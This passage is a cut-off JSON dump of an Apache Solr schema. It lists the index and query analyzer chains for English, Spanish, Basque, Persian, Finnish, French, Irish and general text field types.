olr.PorterStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.en.PorterStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"SynonymFilterFactory\":{\"args\":{\"class\":\"solr.SynonymFilterFactory\",\"expand\":\"true\",\"synonyms\":\"synonyms.txt\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.synonym.SynonymFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_en.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"EnglishPossessiveFilterFactory\":{\"args\":{\"class\":\"solr.EnglishPossessiveFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.en.EnglishPossessiveFilterFactory\"},\"KeywordMarkerFilterFactory\":{\"args\":{\"protected\":\"protwords.txt\",\"class\":\"solr.KeywordMarkerFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory\"},\"PorterStemFilterFactory\":{\"args\":{\"class\":\"solr.PorterStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.en.PorterStemFilterFactory\"}}},\"similarity\":{}},\"text_en_splitting\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.WhitespaceTokenizerFactory\",\"args\":{\"class\":\"solr.WhitespaceTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_en.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"WordDelimiterFilterFactory\":{\"args\":{\"generateNumberParts\":\"1\",\"splitOnCaseChange\":\"1\",\"catenateWords\":\"1\",\"class\":\"solr.WordDelimiterFilterFactory\",\"generateWordParts\":\"1\",\"luceneMatchVersion\":\"LUCENE_44\",\"catenateAll\":\"0\",\"catenateNumbers\":\"1\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.WordDelimiterFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"KeywordMarkerFilterFactory\":{\"args\":{\"protected\":\"protwords.txt\",\"class\":\"solr.KeywordMarkerFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory\"},\"PorterStemFilterFactory\":{\"args\":{\"class\":\"solr.PorterStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.en.PorterStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.WhitespaceTokenizerFactory\",\"args\":{\"class\":\"solr.WhitespaceTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"SynonymFilterFactory\":{\"args\":{\"class\":\"solr.SynonymFilterFactory\",\"expand\":\"true\",\"synonyms\":\"synonyms.txt\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.synonym.SynonymFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_en.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"WordDelimiterFilterFactory\":{\"args\":{\"generateNumberParts\":\"1\",\"splitOnCaseChange\":\"1\",\"catenateWords\":\"0\",\"class\":\"solr.WordDelimiterFilterFactory\",\"generateWordParts\":\"1\",\"luceneMatchVersion\":\"LUCENE_44\",\"catenateAll\":\"0\",\"catenateNumbers\":\"0\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.WordDelimiterFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"KeywordMarkerFilterFactory\":{\"args\":{\"protected\":\"protwords.txt\",\"class\":\"solr.KeywordMarkerFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory\"},\"PorterStemFilterFactory\":{\"args\":{\"class\":\"solr.PorterStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.en.PorterStemFilterFactory\"}}},\"similarity\":{}},\"text_en_splitting_tight\":{\"fields\":[\"sku\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.WhitespaceTokenizerFactory\",\"args\":{\"class\":\"solr.WhitespaceTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"SynonymFilterFactory\":{\"args\":{\"class\":\"solr.SynonymFilterFactory\",\"expand\":\"false\",\"synonyms\":\"synonyms.txt\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.synonym.SynonymFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_en.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"WordDelimiterFilterFactory\":{\"args\":{\"generateNumberParts\":\"0\",\"catenateWords\":\"1\",\"class\":\"solr.WordDelimiterFilterFactory\",\"generateWordParts\":\"0\",\"luceneMatchVersion\":\"LUCENE_44\",\"catenateAll\":\"0\",\"catenateNumbers\":\"1\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.WordDelimiterFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"KeywordMarkerFilterFactory\":{\"args\":{\"protected\":\"protwords.txt\",\"class\":\"solr.KeywordMarkerFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory\"},\"EnglishMinimalStemFilterFactory\":{\"args\":{\"class\":\"solr.EnglishMinimalStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.en.EnglishMinimalStemFilterFactory\"},\"RemoveDuplicatesTokenFilterFactory\":{\"args\":{\"class\":\"solr.RemoveDuplicatesTokenFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.RemoveDuplicatesTokenFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.core.WhitespaceTokenizerFactory\",\"args\":{\"class\":\"solr.WhitespaceTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"SynonymFilterFactory\":{\"args\":{\"class\":\"solr.SynonymFilterFactory\",\"expand\":\"false\",\"synonyms\":\"synonyms.txt\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.synonym.SynonymFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_en.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"WordDelimiterFilterFactory\":{\"args\":{\"generateNumberParts\":\"0\",\"catenateWords\":\"1\",\"class\":\"solr.WordDelimiterFilterFactory\",\"generateWordParts\":\"0\",\"luceneMatchVersion\":\"LUCENE_44\",\"catenateAll\":\"0\",\"catenateNumbers\":\"1\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.WordDelimiterFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"KeywordMarkerFilterFactory\":{\"args\":{\"protected\":\"protwords.txt\",\"class\":\"solr.KeywordMarkerFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory\"},\"EnglishMinimalStemFilterFactory\":{\"args\":{\"class\":\"solr.EnglishMinimalStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.en.EnglishMinimalStemFilterFactory\"},\"RemoveDuplicatesTokenFilterFactory\":{\"args\":{\"class\":\"solr.RemoveDuplicatesTokenFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.miscellaneous.RemoveDuplicatesTokenFilterFactory\"}}},\"similarity\":{}},\"text_es\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_es.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SpanishLightStemFilterFactory\":{\"args\":{\"class\":\"solr.SpanishLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.es.SpanishLightStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_es.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SpanishLightStemFilterFactory\":{\"args\":{\"class\":\"solr.SpanishLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.es.SpanishLightStemFilterFactory\"}}},\"similarity\":{}},\"text_eu\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_eu.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Basque\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_eu.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Basque\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_fa\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"charFilters\":{\"PersianCharFilterFactory\":{\"args\":{\"class\":\"solr.PersianCharFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.fa.PersianCharFilterFactory\"}},\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"ArabicNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.ArabicNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ar.ArabicNormalizationFilterFactory\"},\"PersianNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.PersianNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.fa.PersianNormalizationFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_fa.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"charFilters\":{\"PersianCharFilterFactory\":{\"args\":{\"class\":\"solr.PersianCharFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.fa.PersianCharFilterFactory\"}},\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"ArabicNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.ArabicNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ar.ArabicNormalizationFilterFactory\"},\"PersianNormalizationFilterFactory\":{\"args\":{\"class\":\"solr.PersianNormalizationFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.fa.PersianNormalizationFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_fa.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"}}},\"similarity\":{}},\"text_fi\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_fi.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Finnish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_fi.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Finnish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_fr\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"ElisionFilterFactory\":{\"args\":{\"articles\":\"lang/contractions_fr.txt\",\"class\":\"solr.ElisionFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.util.ElisionFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_fr.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"FrenchLightStemFilterFactory\":{\"args\":{\"class\":\"solr.FrenchLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.fr.FrenchLightStemFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"ElisionFilterFactory\":{\"args\":{\"articles\":\"lang/contractions_fr.txt\",\"class\":\"solr.ElisionFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.util.ElisionFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_fr.txt\",\"class\":\"solr.StopFilterFactory\",\"format\":\"snowball\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"FrenchLightStemFilterFactory\":{\"args\":{\"class\":\"solr.FrenchLightStemFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.fr.FrenchLightStemFilterFactory\"}}},\"similarity\":{}},\"text_ga\":{\"fields\":null,\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"ElisionFilterFactory\":{\"args\":{\"articles\":\"lang/contractions_ga.txt\",\"class\":\"solr.ElisionFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.util.ElisionFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/hyphenations_ga.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"IrishLowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.IrishLowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ga.IrishLowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ga.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Irish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"ElisionFilterFactory\":{\"args\":{\"articles\":\"lang/contractions_ga.txt\",\"class\":\"solr.ElisionFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.util.ElisionFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/hyphenations_ga.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"IrishLowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.IrishLowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.ga.IrishLowerCaseFilterFactory\"},\"StopFilterFactory\":{\"args\":{\"words\":\"lang/stopwords_ga.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SnowballPorterFilterFactory\":{\"args\":{\"class\":\"solr.SnowballPorterFilterFactory\",\"language\":\"Irish\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory\"}}},\"similarity\":{}},\"text_general\":{\"fields\":[\"subject\",\"includes\",\"author\",\"title\",\"description\",\"name\",\"features\",\"text\",\"keywords\",\"resourcename\",\"url\",\"content\",\"category\",\"manu\",\"comments\",\"attr_*\",\"*_txt\",\"*_t\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"StopFilterFactory\":{\"args\":{\"words\":\"stopwords.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"StopFilterFactory\":{\"args\":{\"words\":\"stopwords.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"SynonymFilterFactory\":{\"args\":{\"class\":\"solr.SynonymFilterFactory\",\"expand\":\"true\",\"synonyms\":\"synonyms.txt\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.synonym.SynonymFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"}}},\"similarity\":{}},\"text_general_rev\":{\"fields\":[\"text_rev\"],\"tokenized\":true,\"className\":\"org.apache.solr.schema.TextField\",\"indexAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.StandardTokenizerFactory\",\"luceneMatchVersion\":\"LUCENE_44\"}},\"filters\":{\"StopFilterFactory\":{\"args\":{\"words\":\"stopwords.txt\",\"class\":\"solr.StopFilterFactory\",\"ignoreCase\":\"true\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.StopFilterFactory\"},\"LowerCaseFilterFactory\":{\"args\":{\"class\":\"solr.LowerCaseFilterFactory\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.lucene.analysis.core.LowerCaseFilterFactory\"},\"ReversedWildcardFilterFactory\":{\"args\":{\"maxFractionAsterisk\":\"0.33\",\"withOriginal\":\"true\",\"maxPosQuestion\":\"2\",\"class\":\"solr.ReversedWildcardFilterFactory\",\"maxPosAsterisk\":\"3\",\"luceneMatchVersion\":\"LUCENE_44\"},\"className\":\"org.apache.solr.analysis.ReversedWildcardFilterFactory\"}}},\"queryAnalyzer\":{\"className\":\"org.apache.solr.analysis.TokenizerChain\",\"tokenizer\":{\"className\":\"org.apache.lucene.analysis.standard.StandardTokenizerFactory\",\"args\":{\"class\":\"solr.Standar